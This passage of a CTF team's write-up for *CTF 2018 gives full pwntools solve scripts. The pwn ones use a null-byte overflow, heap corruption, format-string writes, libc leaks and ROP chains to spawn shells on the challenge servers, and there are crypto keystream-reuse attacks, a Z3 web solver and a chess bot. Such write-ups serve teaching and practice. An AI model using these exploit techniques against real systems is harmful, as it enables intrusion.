r.send("a"*4112+p64(buf)+payload+"a"*(6128-4120-len(payload)))

# The first part of payload leak the libc base
r.recvuntil("It's time to say goodbye.\n")
libbase=u64(r.recvline()[:6]+"\x00\x00")-0x6f690
print hex(libbase)
system=libbase+0x45390
binsh=libbase+0x18cd57


# Using stack migration, you input payload again
r.sendline(p64(poprdi)+p64(binsh)+p64(system))



r.interactive()
# *ctf{h4ve_fun_w1th_0ld_tr1ck5_in_2018}
```

### note (sces60107)

You can find out the null-byte overflow in Edit note.

Then you also notice that the format string address is on the stack. You can overwrite it.

Cause the wrong rbp value, you can overwrite return value when calling scanf.

```python=
from pwn import *
import hashlib
import itertools
import string
import os
import time
r=remote("47.89.18.224", 10007)
#env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6')}
#r=process("./note",env=env)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break


proofwork()
s=0x401129
fd=0x602140
printgot=0x601F90
poprdi=0x401003

# Not important
r.recvuntil("Input your ID:")
r.send(cyclic(256))


# You can trigger null-byte overflow
# They put "%d" address on the stack, but rbp is different cause null-byte overflow. Now you can assign other format string. I choose %256s
r.recvuntil("> ")
r.sendline("1")
r.recvuntil("Note:")
r.sendline("a"*168+p64(s)+"a"*(256-176))
r.recvuntil("> ")

# Now the note address can be changed, I have arbitrary read. Just leak libc base address.
r.sendline(p32(2)+p64(s)+p64(printgot))
r.recvuntil("Note:")
heapbase=r.recvline()
print heapbase.encode("hex")
libbase=u64(heapbase[:6]+"\x00\x00")-0x6f690
print hex(libbase)
system=libbase+0x45390
binsh=libbase+0x18cd57

# You overwrite the return address when you call scanf
r.recvuntil("> ")
r.sendline("a"*100+p64(poprdi)+p64(binsh)+p64(system))
r.interactive()
# *ctf{n0te_helps_y0u_use_scanf}
```

### young_heap (4w4rd sces60107)

```python=
from pwn import *

# r = process('./young_heap')
r = remote('47.89.11.82', 10009)

r.recvuntil('xxxx+')
suffix = r.recv(16)
# suffix = 'OWSh3smUNo6dzei7'
r.recvuntil(' == ')
ans = r.recvuntil('\n')[:-1]
# ans = '4dff4cca83f525f0053b69ee61571a04a561293992c3b3ba9cd3dc785c1def16'
x = string.letters + string.digits
b = 0
for c1 in x:
    for c2 in x:
        for c3 in x:
            for c4 in x:
                if hashlib.sha256(c1+c2+c3+c4+suffix).hexdigest() == ans:
                    print c1+c2+c3+c4
                    r.sendline(c1+c2+c3+c4)
                    b = 1
                    break
            if b == 1:
                break
        if b == 1:
            break
    if b == 1:
        break
# r.interactive()

def new_heap(size,cont):
    r.sendlineafter('>> ','1')
    r.sendlineafter(' :',str(size))
    r.sendafter(' :',cont)

def edit(idx,cont):
    r.sendlineafter('>> ','2')
    r.sendlineafter(' :',str(idx))
    r.sendafter(' :',cont)

def delete(idx):
    r.sendafter('>> ','3')
    r.sendafter(' :',str(idx))

new_heap(0x400,'a'*0x400) #0
new_heap(0x400,'a'*0x400) #1
new_heap(0x400,'a'*0x400) #2
new_heap(0x400,'a'*0x400) #3

# delete(1)
# delete(0)
# r.interactive()
edit(0,'a'*0x400+'\x01\x00')
edit(1,'a'*0x400+'\x21\x08')
delete(0)
delete(2)
edit(1,'a'*0x400+'\xa1')
# new_heap(0x90)
delete(1)
# r.interactive()
# edit(1,p64(0)+p64(0x10000))
# delete(2)
printf_plt = 0x4008a0
addr = 0x602068
new_heap(0x810,'%13$p\n\x00'+'a'*(0x400-7)+p64(0)+p64(0x410)+p64(addr)) #0
new_heap(0x400,'a') #1
new_heap(0x400,p64(printf_plt)) #2
delete(0)
l = int(r.recvuntil('\n').strip(),16)
# print hex(l)
libc = l - 0x20830
system = libc + 0x45390
print hex(libc)
print hex(system)

def fmt_att(fmt):
    new_heap(0x100, fmt)  # 0
    delete(0)
# r.interactive()
# get address here
# r.interactive()\n
# 15 & 41 & 42
fmt_att('%15$p\n\n')
base = int(r.recvuntil('\n').strip(),16)
print hex(base)
fmt_att('%15$s\n\n')
k = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
print hex(k)
attack_point = base + 8
fmt_att("%"+str((attack_point+2)&0xffff)+'c%15$hn')
fmt_att("%"+str(0x60)+'c%41$hn')
fmt_att("%"+str(attack_point&0xffff)+'c%15$hn')
fmt_att("%"+str(0x20e0)+'c%41$hn')
# fmt_att("%42$s\n\n")
# k = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
# print hex(k)
# print hex(system&0xffff)
fmt_att('%'+str(0x2060)+'c%42$hn')
fmt_att("%"+str(0x20e2)+'c%41$hn')
fmt_att('%'+str(0x60)+'c%42$hn')
edit(4,p64(system))
# fmt_att("%42$p")
# new_heap(0x100,'%15$ln')#0
# delete(0)
r.interactive()

```

## web

### simpleweb (how2hack)
I use Z3 to find the solution for this challenge.
```python
#!/usr/bin/env python

from z3 import *

value = [BitVec("val_%d" % i, 32) for i in range(5)]

s = Solver()
for i in range(5):
    s.add(value[i] >= 0)
    s.add(value[i] <= 127)

s.add(((((value[0]+value[1])*0x100+(value[1]+value[2]))*0x100+(value[2]+value[3]))*0x100+(value[3]+value[4])) == 0x23332333)

if s.check() != sat:
    print "unsat"
else:
    while s.check() == sat:
        print s.model()
        s.add(Or(value[0] != s.model()[value[0]], value[1] != s.model()[value[1]], value[2] != s.model()[value[2]], value[3] != s.model()[value[3]], value[4] != s.model()[value[4]]))
        
'''
[val_3 = 18, val_2 = 17, val_0 = 1, val_1 = 34, val_4 = 33]
[val_4 = 32, val_1 = 35, val_0 = 0, val_2 = 16, val_3 = 19]
[val_4 = 48, val_1 = 19, val_0 = 16, val_2 = 32, val_3 = 3]
[val_4 = 50, val_1 = 17, val_0 = 18, val_2 = 34, val_3 = 1]
[val_4 = 49, val_1 = 18, val_0 = 17, val_2 = 33, val_3 = 2]
[val_4 = 51, val_1 = 16, val_0 = 19, val_2 = 35, val_3 = 0]
[val_4 = 44, val_1 = 23, val_0 = 12, val_2 = 28, val_3 = 7]
[val_4 = 46, val_1 = 21, val_0 = 14, val_2 = 30, val_3 = 5]
[val_4 = 45, val_1 = 22, val_0 = 13, val_2 = 29, val_3 = 6]
[val_4 = 47, val_1 = 20, val_0 = 15, val_2 = 31, val_3 = 4]
[val_4 = 40, val_1 = 27, val_0 = 8, val_2 = 24, val_3 = 11]
[val_4 = 42, val_1 = 25, val_0 = 10, val_2 = 26, val_3 = 9]
[val_4 = 41, val_1 = 26, val_0 = 9, val_2 = 25, val_3 = 10]
[val_4 = 43, val_1 = 24, val_0 = 11, val_2 = 27, val_3 = 8]
[val_4 = 36, val_1 = 31, val_0 = 4, val_2 = 20, val_3 = 15]
[val_4 = 38, val_1 = 29, val_0 = 6, val_2 = 22, val_3 = 13]
[val_4 = 37, val_1 = 30, val_0 = 5, val_2 = 21, val_3 = 14]
[val_4 = 39, val_1 = 28, val_0 = 7, val_2 = 23, val_3 = 12]
[val_4 = 34, val_1 = 33, val_0 = 2, val_2 = 18, val_3 = 17]
[val_4 = 35, val_1 = 32, val_0 = 3, val_2 = 19, val_3 = 16]
'''
```
There are multiple solutions. However, Javascript Array.sort() is a weird function... It sort the array in alphabetical order even for numbers, which means '12' < '4'. So the only solution is `[val_4 = 47, val_1 = 20, val_0 = 15, val_2 = 31, val_3 = 4]`.

Flag: `*ctf{web_chal_made_by_binary_players_lol}`

## misc

### welcome (bookgin)

Install: http://www.ecs.umass.edu/ece/koren/architecture/Simplescalar/SimpleScalar_introduction.htm
Run: `./sim-fast ../1355a2b7-44dc-451f-a826-6debe8467923.welcome`
Flag: `*ctf{we1_t0_*ctf}`

### warmup (sces60107)

It's a easy challenge

```python=
from pwn import *
import os
r=remote("47.91.226.78", 10006)
#env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253')}
#r=process("./warmup",env=env)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(r)[0],'b *'+hex(0x400961)+'\nc\n')


poprdi=0x400a63
main=0x4008b9
putsgot=0x600fa8
putsplt=0x4006d8

# you can read whatever you want
print r.recvuntil("What are you looking for?")
r.sendline(str(putsgot))
print r.recvline()
libbase=int(r.recvline(),16)-0x6f690

# compute system address
system=libbase+0x45390
poprdi=libbase+0x21102
binsh=libbase+0x18cd57
print hex(libbase)

# Easy stack overflow
print r.recvuntil("What's your name?")
r.sendline("a"*40+p64(poprdi)+p64(binsh)+p64(system))


r.interactive()
# *ctf{h0pe_th1s_e4zy_gam3_warm_y0u_up}
```

## ppc

### magic_number (b04902036)

simply use a binary search

```python
#!/usr/bin/python

from pwn import *

host = '47.89.18.224'
port = 10011

r = remote(host, port)
count = 0
while(1):
    count += 1
    r.recvuntil(': n = ')
    n = int(r.recvuntil('\n').strip())
    dic = dict()
    send_num = 0
    ans = []
    same = 0
    same_ans = 0
    for i in range(n):
        if(same > 0):
            same -= 1
            for item in total:
                dic[(item[0], item[1])] -= 1
            ans.append(same_ans)
            continue
        total = set()
        start = 0
        end = 1024
        prenum = n - i
        while(1):
            mid = (start + end) // 2
            if((start, mid) in dic):
                num = dic[(start, mid)]
            else:
                send_num += 1
                r.sendline('? ' + str(start) + ' ' + str(mid))
                num = int(r.recvuntil('\n').strip())
                dic[(start, mid)] = num
            if(num > 0):
                prenum = num
                total.add((start, mid))
                dic[(start, mid)] -= 1
                end = mid
                if(mid - start == 1):
                    same = num - 1
                    same_ans = start
                    ans.append(start)
                    break
            else:
                start = mid
                if(end - mid == 1):
                    same = prenum - 1
                    same_ans = mid
                    ans.append(mid)
                    break
    msg = '!'
    for i in ans:
        msg += ' ' + str(i)
    r.sendline(msg)
    if(count == 10):
        break
r.interactive()
```

Flag: *ctf{magic algorithm produces magic numbers!}


### Chess Master (bookgin)

We use WCCC 2017 champion komodo as our engine. The code is very dirty. We use wireshark to record the last packet and get flag.

```python
#!/usr/bin/env python3
# Python 3.6.4

from pwn import *
import string
import hashlib
import chess # https://github.com/niklasf/python-chess
import chess.uci as uci

komodo = './komodo-9.02-linux'

def PoW():
    r.recvuntil('sha256(xxxx+')
    x = r.recvuntil(') ==', drop=True).decode()
    y = r.recvline().decode()
    y = y[:-1]
    print(x)
    print(y)
    s = string.ascii_letters+string.digits
    for i in s:
        for j in s:
            for k in s:
                for l in s:
                    h = hashlib.sha256()
                    guess = (i+j+k+l+x).encode()
                    h.update(guess)
                    z = h.hexdigest()
                    if z == y:
                        print(guess)
                        r.sendline(i+j+k+l)
                        break

def parseBoard(s, rnd=0, turn='w'):
    fen = ''
    cnt = 0
    for c in (s.strip() + '\n').replace(' ', '').replace('\n', '/'):
        if c == '.':
            cnt += 1
        else:
            if cnt != 0:
                fen += str(cnt)
                cnt = 0
            fen += c
    fen = fen.strip('/')
    return chess.Board(f"{fen} {turn} KQkq - 3 {rnd}")


engine = uci.popen_engine(komodo)
engine.uci()
print(f'loaded "{engine.name}"')


r = remote('47.89.11.82', 10012)
PoW()
print('[+] PoW Done')
r.recvuntil('game starts\n')
engine.ucinewgame()

win_times = 0

# Use wireshark to record packet and get flag XD
while True:
    print(win_times)
    buf = r.recvuntil('input your move(like e2e4):', drop=True).decode()
    if 'you win' in buf:
        win_times += 1
        buf = buf[buf.find('game starts\n')+len('game starts\n'):]
    raw_board = buf


    board = parseBoard(raw_board)
    engine.position(board)
    best_move, ponder_move = engine.go(movetime=50)
    r.sendline(str(best_move))
    #buf = r.recv(16)
    #if b'win' in buf:
    #    break
    #print(buf)

engine.quit()
```

Flag: `*ctf{chess_is_s0_ea5y}`

## crypto

### primitive (sasdf)

```python=
from pwn import *
import numpy as np
import itertools as it
import string
from hashlib import sha256
import multiprocessing as mp
from PoW import remote

# Connect to game server & PoW
r = remote('47.75.4.252', 10001)

# Cipher operations
def add(a, b):
    return (a + b) & 0xff

def rot(a, b):
    return (a>>(8-b) & 0xff) | ((a<<b) & 0xff)

def xor(a, b):
    return (a ^ b)

def msb(a):
    return a & 0x80

def mask(a, b):
    return a & (0xff << b) & 0x7f


msk = 0 # How many bits at the end is OK
sft = 0 # How many times we rotate the bytes.

def setMSB():
    global msk, ct, pt
    while True:
        # Find which char's MSB needs to be flip.
        flip = [msb(p) != msb(c) for p, c in zip(pt, ct)]
        if not any(flip):
            return

        # Get first char that needs to be flip.
        idx = next(i for i, e in enumerate(flip) if e)
        cur = mask(ct[idx], msk)

        # Make sure we won't flip some MSB that shouldn't be flip.
        while any(mask(c, msk) == cur for c, f in zip(ct, flip) if not f):
            if msk <= 0:
                raise ValueError('Conflict')
            msk -= 1
            cur = mask(ct[idx], msk)

        # Make all bits in range [msk, 7] of target char to be 1.
        cur = mask(~cur, msk)
        assert(cur >= 0 and cur < 256)
        r.sendline(('2 %d' % cur).rjust(9, '0'))

        # Use carry to flip MSB of target char.
        assert((1 << msk) >= 0 and (1 << msk) < 256)
        r.sendline(('0 %d' % (1<<msk)).rjust(9, '0'))

        # Update states at local side
        ct = [add(xor(c, cur), (1 << msk)) for c in ct]

def run():
    global pt, ct, msk, sft, cmd
    sft = 0
    msk = 0
    r.recvuntil('Current ciphertext is ')
    ct = r.recvline().strip()
    log.info('Ciphertext: %s' % ct)
    ct = [ord(c) for c in ct.decode('hex')]
    pt = [ord(c) for c in 'GoodCipher']

    # Keep trying until we success
    while True:
        try:
            setMSB()
            msk += 1
            # log.info('msk: %d' % msk)
        except ValueError:
            # We have `axxxxxxx` and `bxxxxxxx`, but only one of them need to be flip
            # Rotate one bit and retry
            msk = 0
            # log.info('Reset')

        # Rotate left
        pt = [rot(p, 1) for p in pt]
        ct = [rot(c, 1) for c in ct]
        r.sendline('1 1'.rjust(9, '0'))
        r.recvuntil('OK')
        sft += 1

        # Success
        if msk == 8:
            assert(pt == ct)
            sft = (-sft) % 8
            r.sendline(('1 %d' % sft).rjust(9, '0'))
            r.send('0'*10)
            return

for i in range(3):
    run()

r.recvuntil('Good job! Your flag here.\n')
print(r.recv(1000))
```

### ssss (sasdf)

```python=
from pwn import *
import numpy as np
import hmac,hashlib
from PoW import remote

r = remote('47.75.4.252', 10002)

def pad(msg):
    n = 16 - len(msg)%16
    return msg + chr(n)*n

msg = '\x02Welcome to Sixstars Secret Storage Service\nCommands:\n\tset [key]\tstore a secret with given key\n\tget [key]\tget a secret with given key\n'
msg = pad(msg)

# Setup key
r.send('\x00' + '\0' * 16)
s = r.recv(1+16+8)
ctr = s[1:17]
mac = s[17:]

# Setup keystream
r.send('\x01' + ctr + mac)
r.recvuntil('\x01' + ctr)
cipher = r.recv(len(msg))
ks = xor(cipher, msg)[16:]

plain = pad('\x02get flag')

# Get ciphertext of dat['flag']
ct = xor(ks[:len(plain)], plain)
r.send(ct)
ks = ks[16:]
flag = r.recv(1000)

# Get plaintext of prefix random bytes
rand = xor(ks, flag[:len(ks)])
kks = ks[:]
ks = ks[16:]

# Generate keystream by prefix random bytes
while len(kks) < len(flag):
    ct = xor(ks[:len(plain)], plain)
    r.send(ct)
    ks = ks[16:]
    res = r.recv(1000)
    new = xor(res[:len(rand)], rand)
    assert(new[:len(ks)] == ks)
    kks += new[len(ks):]
    ks = new
    ks = ks[16:]

# Decrypt the FLAG
flag = xor(flag, kks[:len(flag)])[141:]
flag = flag[:-ord(flag[-1])]
print(flag)

# Cleanup
r.close()
```

### ssss2 (sasdf)

```python=
from pwn import *
import numpy as np
import hmac,hashlib
from PoW import remote

r = [remote('47.75.4.252', 10003) for _ in range(3)]
r1, r2, r3 = r

def pad(msg):
    n = 16 - len(msg)%16
    return msg + chr(n)*n

xor = lambda a, b: ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(a, b))

msg = '\x02Welcome to Sixstars Secret Storage Service\nCommands:\n\tset [key]\tstore a secret with given key\n\tget [key]\tget a secret with given key\n'
msg = pad(msg)

# Setup key
for ri in r:
    ri.send('\x00' + '\0' * 16)
    s = ri.recv(1+16+8)
ctr = s[1:17]
mac = s[17:]

# Setup keystream
for ri in r:
    ri.send('\x01' + ctr + mac)
    ri.recvuntil('\x01' + ctr)
    cipher = ri.recv(len(msg))
ks = xor(cipher, msg)
kks = ks[:]
ks = ks[16:]

# Set dat[a] = a
for ri in r:
    ri.send(xor(ks, pad('\x02set a')))
ks = ks[16:]
for ri in r:
    ri.recvuntil(xor(ks, pad('\x02value?')))
ks = ks[16:]
for ri in r:
    ri.send(xor(ks, pad('\x02a')))
ks = ks[16:]
for ri in r:
    ri.recvuntil(xor(ks, pad('\x02OK')))
ks = ks[16:]
ck = ks[:16]

# Reset r2 keystream
r2.send(xor(ks, pad('\x01' + ctr + mac)))
ks = kks
r2.recvuntil(xor(ks, pad('\x01' + ctr)))
ks = ks[16:]
cipher = r2.recv(len(msg))
assert( xor(cipher, ks) == msg[:-16] )
ks = ks[16:]

# Increase r2 counter to (r1 counter + 1)
r2.send(xor(ks, pad('\x02get a')))
ks = ks[16:]
r2.recvuntil(xor(ks, pad('\x02a')))
ks = ks[16:]
r2.send(xor(ks, pad('\x02get a')))
ks = ks[16:]
r2.recvuntil(xor(ks, pad('\x02a')))
ks = ks[16:]

# Use r1 r2 to generate keystream
def ksgen(ck):
    while True:
        yield ck
        r1.send(xor(ck, pad('\x02get a')))
        ck = r1.recv(1000)
        assert( len(ck) == 16 )
        ck = xor(ck, pad('\x02a'))
        yield ck
        r2.send(xor(ck, pad('\x02get a')))
        ck = r2.recv(1000)
        assert( len(ck) == 16 )
        ck = xor(ck, pad('\x02a'))
ks = ksgen(ck)

# Get the FLAG
r3.send(xor(next(ks), pad('\x02get flag')))
for i in range(12):
    log.info('Round %d' % i)
    query = r3.recv(1000)
    assert( len(query) == 16 )
    query = xor(next(ks), query)
    a, b = map(int, query[:query.index('=')].split('+'))
    r3.send(xor(next(ks), pad('\x02%d' % (a+b))))

# Decrypt the FLAG
flag = r3.recv(1000)
k = ''
while len(k) < len(flag):
    k += next(ks)
flag = xor(flag, k)
flag = flag[141:-ord(flag[-1])]
print(flag)

# Cleanup
for ri in r:
    ri.close()
```
